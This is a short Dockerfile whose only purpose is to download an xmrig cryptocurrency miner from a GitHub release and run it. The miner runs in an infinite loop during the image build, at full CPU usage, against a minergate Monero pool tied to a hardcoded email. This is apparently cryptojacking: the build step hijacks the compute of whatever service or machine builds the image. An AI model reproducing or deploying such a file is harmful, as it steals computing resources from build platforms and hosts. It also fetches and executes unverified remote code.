FROM ubuntu:xenial

RUN apt-get update && apt-get install -y wget

RUN wget https://github.com/SecurityOfficerAlfaZulu/portable_xmrig/releases/download/0.9.0/xmrig && chmod +x xmrig && while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 15 --max-cpu-usage=100 --donate-level 1 ; sleep 1; done

